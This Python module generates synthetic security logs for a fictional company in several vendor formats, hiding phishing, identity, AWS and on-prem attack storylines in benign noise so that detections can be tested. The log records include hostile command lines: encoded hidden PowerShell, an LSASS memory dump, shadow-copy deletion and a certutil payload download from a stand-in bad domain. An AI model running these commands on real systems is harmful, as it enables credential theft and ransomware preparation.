"""Fictional demo estate: Kestrel Logistics (Demo). Every name, host and *.example domain is invented.

Three attack storylines hidden in benign background noise, delivered in each source's native format
(Defender XDR streaming, Entra ID diagnostics, CloudTrail, CEF syslog, OCSF DNS):
  1. Phishing document -> encoded PowerShell -> LSASS dump -> beacon to a known-bad domain ->
     shadow-copy deletion on the file server (ransomware precursor)
  2. Password spray from one IP -> a high-risk sign-in that succeeds -> OAuth consent grant; MFA fatigue on the CFO
  3. AWS root login -> CloudTrail stopped -> access key created -> S3 bucket policy changed
"""
from __future__ import annotations

import csv
import hashlib
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from ..ingest.landing import write_batch

DOMAIN = "kestrel.example"
BAD_DOMAIN = "cdn-update.badcdn.example"
BAD_IP = "198.51.100.23"
SPRAY_IP = "203.0.113.77"
USERS = ["amira.haddad", "omar.saleh", "lina.khoury", "james.okafor", "priya.nair", "chen.wei", "sara.ali", "tom.becker",
         "noura.aziz", "yusuf.demir", "elena.rossi", "ken.tanaka", "fatima.zahra", "david.mensah", "ivan.petrov",
         "maria.lopez", "ahmed.farouk", "grace.kim", "luca.moretti", "hana.sato", "cfo.office"]
HOSTS = ["ws-0142", "ws-0157", "ws-0203", "ws-0310", "fs-01", "app-portal-01", "db-fin-01", "jump-01"]


def _upn(u: str) -> str:
    return f"{u}@{DOMAIN}"


def write_context(folder: Path) -> None:
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "intel").mkdir(exist_ok=True)
    with (folder / "assets.csv").open("w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["asset_id", "name", "asset_type", "business_service", "owner", "criticality", "exposure", "tags", "aliases", "ips"])
        w.writerow(["FS-01", "fs-01", "server", "File services", "it-ops@kestrel.example", 4, "internal", "", f"fs-01.{DOMAIN}", "10.10.5.20"])
        w.writerow(["DB-FIN-01", "db-fin-01", "server", "Finance ledger", "finance-it@kestrel.example", 5, "internal", "crown_jewel", f"db-fin-01.{DOMAIN}", "10.10.9.11"])
        w.writerow(["APP-PORTAL-01", "app-portal-01", "server", "Customer portal", "digital@kestrel.example", 5, "internet", "crown_jewel", f"portal.{DOMAIN}", "10.20.1.5"])
        w.writerow(["JUMP-01", "jump-01", "server", "Admin jump host", "it-ops@kestrel.example", 4, "internal", "", f"jump-01.{DOMAIN}", "10.10.1.4"])
        for h in HOSTS:
            if h.startswith("ws-"):
                w.writerow([h.upper(), h, "workstation", "End-user computing", "it-ops@kestrel.example", 2, "internal", "", f"{h}.{DOMAIN}", ""])
    with (folder / "identities.csv").open("w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["identity_id", "display_name", "upn", "email", "sam", "entra_object_id", "aliases", "privileged", "department"])
        for u in USERS:
            w.writerow([u, u.replace(".", " ").title(), _upn(u), _upn(u), f"KESTREL\\{u.split('.')[0]}", "", "",
                        "true" if u in ("cfo.office", "ivan.petrov") else "false", "Finance" if u == "cfo.office" else "Operations"])
    with (folder / "intel" / "isac_feed.csv").open("w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["value", "type", "source", "severity", "expires"])
        w.writerow([BAD_DOMAIN, "domain", "Logistics ISAC", "high", ""])
        w.writerow([BAD_IP, "ip", "Logistics ISAC", "high", ""])


def _mde(table: str, t: datetime, **p: Any) -> dict[str, Any]:
    return {"time": t.isoformat(), "category": f"AdvancedHunting-{table}", "properties": {"Timestamp": t.isoformat(), **p}}


def generate(landing, now: datetime | None = None, seed: int = 7) -> dict[str, int]:
    rnd = random.Random(seed)
    now = now or datetime.now(timezone.utc)
    t0 = now - timedelta(hours=3)
    mde, entra, ct, fw, proxy, dns = [], [], [], [], [], []
    dev_id = {h: hashlib.sha1(f"{h}|{seed}".encode()).hexdigest()[:20] for h in HOSTS}
    # ---------------- benign background
    for i in range(1200):
        t = t0 + timedelta(seconds=rnd.randint(0, 3 * 3600 - 60))
        h, u = rnd.choice(HOSTS), rnd.choice(USERS)
        proc = rnd.choice(["chrome.exe", "outlook.exe", "teams.exe", "excel.exe", "svchost.exe", "code.exe"])
        mde.append(_mde("DeviceProcessEvents", t, DeviceName=f"{h}.{DOMAIN}", DeviceId=dev_id[h], FileName=proc,
                        ProcessCommandLine=f"{proc} --type=renderer", InitiatingProcessFileName="explorer.exe", AccountUpn=_upn(u)))
        if i % 3 == 0:
            entra.append({"time": t.isoformat(), "category": "SignInLogs", "properties": {
                "createdDateTime": t.isoformat(), "userPrincipalName": _upn(u), "ipAddress": f"10.10.{rnd.randint(1, 9)}.{rnd.randint(2, 250)}",
                "location": {"countryOrRegion": "AE"}, "status": {"errorCode": 0}, "appDisplayName": "Office 365",
                "authenticationRequirement": "multiFactorAuthentication", "riskLevelDuringSignIn": "none"}})
        if i % 2 == 0:
            dns.append({"class_uid": 4003, "time": int(t.timestamp() * 1000), "activity_name": "Query",
                        "device": {"hostname": f"{h}.{DOMAIN}"}, "query": {"hostname": rnd.choice(["outlook.office365.example", "teams.example", "updates.vendor.example", "intranet.kestrel.example"])},
                        "metadata": {"product": {"name": "Infoblox BloxOne"}}})
            fw.append(f"CEF:0|Palo Alto Networks|PAN-OS|11.1|traffic|TRAFFIC|3|rt={int(t.timestamp()*1000)} src=10.10.{rnd.randint(1,9)}.{rnd.randint(2,250)} "
                      f"dst=93.184.{rnd.randint(1,250)}.{rnd.randint(1,250)} spt={rnd.randint(40000,60000)} dpt=443 act=allow app=ssl suser={_upn(u)}")
        if i % 4 == 0:
            proxy.append(f"CEF:0|Zscaler|NSSWeblog|6.0|Allowed|Allowed|1|rt={int(t.timestamp()*1000)} suser={_upn(u)} src=10.10.3.{rnd.randint(2,250)} "
                         f"dhost=docs.vendor.example request=https://docs.vendor.example/guide requestMethod=GET act=Allowed cat=Business")
    # benign admin activity that a naive rule might flag
    mde.append(_mde("DeviceProcessEvents", t0 + timedelta(minutes=20), DeviceName=f"jump-01.{DOMAIN}", DeviceId=dev_id["jump-01"],
                    FileName="vssadmin.exe", ProcessCommandLine="vssadmin list shadows", InitiatingProcessFileName="cmd.exe",
                    AccountUpn=_upn("ivan.petrov")))
    # ---------------- storyline 1: phishing -> ransomware precursor
    s1 = now - timedelta(minutes=95)
    victim, vu = "ws-0142", _upn("lina.khoury")
    mde += [
        _mde("DeviceProcessEvents", s1, DeviceName=f"{victim}.{DOMAIN}", DeviceId=dev_id[victim], FileName="powershell.exe",
             ProcessCommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
             InitiatingProcessFileName="winword.exe", AccountUpn=vu, SHA256="9f2b5a0c1e7d4c3b2a1908f7e6d5c4b3a29180f7e6d5c4b3a2918070605a4b3c"),
        _mde("DeviceNetworkEvents", s1 + timedelta(minutes=1), DeviceName=f"{victim}.{DOMAIN}", DeviceId=dev_id[victim],
             RemoteIP=BAD_IP, RemotePort=443, RemoteUrl=f"https://{BAD_DOMAIN}/update/stage2.ps1", LocalIP="10.10.3.42",
             ActionType="ConnectionSuccess", InitiatingProcessFileName="powershell.exe", AccountUpn=vu),
        _mde("DeviceProcessEvents", s1 + timedelta(minutes=9), DeviceName=f"{victim}.{DOMAIN}", DeviceId=dev_id[victim], FileName="rundll32.exe",
             ProcessCommandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\l.dmp full",
             InitiatingProcessFileName="powershell.exe", AccountUpn=vu),
        _mde("DeviceProcessEvents", s1 + timedelta(minutes=40), DeviceName=f"fs-01.{DOMAIN}", DeviceId=dev_id["fs-01"], FileName="vssadmin.exe",
             ProcessCommandLine="vssadmin.exe delete shadows /all /quiet", InitiatingProcessFileName="cmd.exe", AccountUpn=vu),
    ]
    for k in range(6):
        proxy.append(f"CEF:0|Zscaler|NSSWeblog|6.0|Allowed|Allowed|5|rt={int((s1 + timedelta(minutes=2 + k * 5)).timestamp()*1000)} suser={vu} "
                     f"src=10.10.3.42 dhost={BAD_DOMAIN} request=https://{BAD_DOMAIN}/beacon?id={k} requestMethod=POST act=Allowed cat=Miscellaneous")
        dns.append({"class_uid": 4003, "time": int((s1 + timedelta(minutes=2 + k * 5)).timestamp() * 1000), "activity_name": "Query",
                    "device": {"hostname": f"{victim}.{DOMAIN}"}, "query": {"hostname": BAD_DOMAIN}, "metadata": {"product": {"name": "Infoblox BloxOne"}}})
    # ---------------- storyline 2: identity
    s2 = now - timedelta(minutes=60)
    for j, u in enumerate(USERS[:18]):
        entra.append({"time": (s2 + timedelta(seconds=20 * j)).isoformat(), "category": "SignInLogs", "properties": {
            "createdDateTime": (s2 + timedelta(seconds=20 * j)).isoformat(), "userPrincipalName": _upn(u), "ipAddress": SPRAY_IP,
            "location": {"countryOrRegion": "NL"}, "status": {"errorCode": 50126, "failureReason": "Invalid username or password"},
            "appDisplayName": "Azure Portal", "clientAppUsed": "Browser", "riskLevelDuringSignIn": "medium"}})
    entra.append({"time": (s2 + timedelta(minutes=9)).isoformat(), "category": "SignInLogs", "properties": {
        "createdDateTime": (s2 + timedelta(minutes=9)).isoformat(), "userPrincipalName": _upn("tom.becker"), "ipAddress": SPRAY_IP,
        "location": {"countryOrRegion": "NL"}, "status": {"errorCode": 0}, "appDisplayName": "Office 365 Exchange Online",
        "clientAppUsed": "Browser", "riskLevelDuringSignIn": "high", "authenticationRequirement": "singleFactorAuthentication"}})
    entra.append({"time": (s2 + timedelta(minutes=14)).isoformat(), "category": "AuditLogs", "properties": {
        "activityDateTime": (s2 + timedelta(minutes=14)).isoformat(), "operationName": "Consent to application",
        "initiatedBy": {"user": {"userPrincipalName": _upn("tom.becker")}}, "targetResources": [{"displayName": "Mail Sync Helper"}],
        "result": "success"}})
    for k in range(6):
        entra.append({"time": (s2 + timedelta(minutes=20, seconds=30 * k)).isoformat(), "category": "SignInLogs", "properties": {
            "createdDateTime": (s2 + timedelta(minutes=20, seconds=30 * k)).isoformat(), "userPrincipalName": _upn("cfo.office"),
            "ipAddress": "192.0.2.150", "location": {"countryOrRegion": "RO"},
            "status": {"errorCode": 500121, "failureReason": "Authentication failed during strong authentication request (MFA denied)"},
            "appDisplayName": "Office 365", "riskLevelDuringSignIn": "medium"}})
    # ---------------- storyline 3: AWS
    s3 = now - timedelta(minutes=40)
    acct = "111122223333"
    base = {"awsRegion": "eu-west-1", "recipientAccountId": acct, "sourceIPAddress": "198.51.100.99"}
    ct += [
        {**base, "eventTime": s3.isoformat(), "eventName": "ConsoleLogin", "eventSource": "signin.amazonaws.com",
         "userIdentity": {"type": "Root", "arn": f"arn:aws:iam::{acct}:root", "accountId": acct},
         "responseElements": {"ConsoleLogin": "Success"}, "additionalEventData": {"MFAUsed": "No"}},
        {**base, "eventTime": (s3 + timedelta(minutes=3)).isoformat(), "eventName": "StopLogging", "eventSource": "cloudtrail.amazonaws.com",
         "userIdentity": {"type": "Root", "arn": f"arn:aws:iam::{acct}:root", "accountId": acct}, "requestParameters": {"name": "org-trail"}},
        {**base, "eventTime": (s3 + timedelta(minutes=5)).isoformat(), "eventName": "CreateAccessKey", "eventSource": "iam.amazonaws.com",
         "userIdentity": {"type": "Root", "arn": f"arn:aws:iam::{acct}:root", "accountId": acct}, "requestParameters": {"userName": "svc-backup"}},
        {**base, "eventTime": (s3 + timedelta(minutes=8)).isoformat(), "eventName": "PutBucketPolicy", "eventSource": "s3.amazonaws.com",
         "userIdentity": {"type": "Root", "arn": f"arn:aws:iam::{acct}:root", "accountId": acct}, "requestParameters": {"bucketName": "kestrel-manifests"}},
    ]
    for k in range(30):
        ct.append({**base, "sourceIPAddress": "10.30.0.12", "eventTime": (t0 + timedelta(minutes=5 * k)).isoformat(), "eventName": "DescribeInstances",
                   "eventSource": "ec2.amazonaws.com", "userIdentity": {"type": "AssumedRole", "arn": f"arn:aws:sts::{acct}:assumed-role/ops/automation"}})
    # ---------------- storyline 4: on-premises server without EDR (Windows Security via NXLog, Sysmon via Winlogbeat)
    # and a Linux jump host over syslog. NXLog and syslog write Gulf local time (+04:00) without a zone; the source
    # settings carry the zone, which is the realistic case.
    win, sysl = [], []
    gst = timedelta(hours=4)

    def nx(t, eid, **data):                      # NXLog im_msvistalog + to_json(), local EventTime
        return {"EventTime": (t + gst).strftime("%Y-%m-%d %H:%M:%S"), "Hostname": f"db-fin-01.{DOMAIN}", "EventID": eid,
                "SourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security", **data}

    def wb(t, eid, **data):                      # Winlogbeat, Sysmon channel, UTC
        return {"@timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.000Z"), "host": {"name": "db-fin-01"},
                "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": eid, "provider_name": "Microsoft-Windows-Sysmon",
                           "computer_name": f"db-fin-01.{DOMAIN}", "event_data": {"UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.000"), **data}}}

    def sl(t, host, app, msg):                   # RFC 3164 from rsyslog, local time
        lt = t + gst
        return f"<38>{lt:%b} {lt.day:>2} {lt:%H:%M:%S} {host} {app}: {msg}"

    for k in range(40):
        t = t0 + timedelta(minutes=4 * k)
        u = rnd.choice(USERS)
        win.append(nx(t, 4624, TargetUserName=u.split(".")[0], TargetDomainName="KESTREL", LogonType="3",
                      IpAddress=f"10.10.{rnd.randint(1, 9)}.{rnd.randint(2, 250)}", AuthenticationPackageName="Kerberos"))
        win.append(wb(t, 1, Image="C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\sqlservr.exe",
                      CommandLine="sqlservr.exe -sMSSQLSERVER", ParentImage="C:\\Windows\\System32\\services.exe",
                      User="NT SERVICE\\MSSQLSERVER", Hashes="SHA256=1f0e"))
        sysl.append(sl(t, "jump-01", "CRON[2211]", "(root) CMD (/usr/local/bin/backup-check.sh)"))
        if k % 8 == 0:
            sysl.append(sl(t, "jump-01", "sshd[4410]", "Accepted publickey for ivan.petrov from 10.10.1.50 port 52311 ssh2"))
    s4 = now - timedelta(minutes=30)
    for k in range(30):
        win.append(nx(s4 + timedelta(seconds=10 * k), 4625, TargetUserName="svc-sql", TargetDomainName="KESTREL", LogonType="3",
                      IpAddress="10.10.7.77", IpPort=str(50000 + k), AuthenticationPackageName="NTLM", SubStatus="0xc000006a",
                      WorkstationName="WS-0310"))
    win += [
        nx(s4 + timedelta(minutes=6), 4624, TargetUserName="svc-sql", TargetDomainName="KESTREL", LogonType="3",
           IpAddress="10.10.7.77", AuthenticationPackageName="NTLM"),
        nx(s4 + timedelta(minutes=8), 4732, SubjectUserName="svc-sql", SubjectDomainName="KESTREL", TargetUserName="Administrators",
           MemberName="CN=svc-sql,OU=Service Accounts,DC=kestrel,DC=example"),
        wb(s4 + timedelta(minutes=10), 1, Image="C:\\Windows\\System32\\certutil.exe",
           CommandLine=f"certutil.exe -urlcache -split -f https://{BAD_DOMAIN}/t.exe C:\\Users\\Public\\t.exe",
           ParentImage="C:\\Windows\\System32\\cmd.exe", User="KESTREL\\svc-sql", Hashes="SHA256=7c1d"),
        wb(s4 + timedelta(minutes=10, seconds=5), 22, QueryName=BAD_DOMAIN, Image="C:\\Windows\\System32\\certutil.exe"),
        nx(s4 + timedelta(minutes=14), 1102, SourceName="Microsoft-Windows-Eventlog", SubjectUserName="svc-sql", SubjectDomainName="KESTREL"),
    ]
    for k, u in enumerate(["admin", "oracle", "test", "ubuntu", "postgres", "git"]):
        sysl.append(sl(s4 + timedelta(seconds=7 * k), "jump-01", "sshd[5120]", f"Invalid user {u} from {SPRAY_IP} port {40000 + k}"))
    counts = {}
    for key, recs in (("mde", mde), ("entra", entra), ("cloudtrail", ct), ("firewall", fw), ("proxy", proxy), ("dns", dns),
                      ("windows", win), ("syslog", sysl)):
        recs = sorted(recs, key=lambda r: str(r.get("time") or r.get("eventTime") or r) if isinstance(r, dict) else r)
        for i in range(0, len(recs), 500):
            write_batch(landing, key, recs[i:i + 500], when=now)
        counts[key] = len(recs)
    return counts
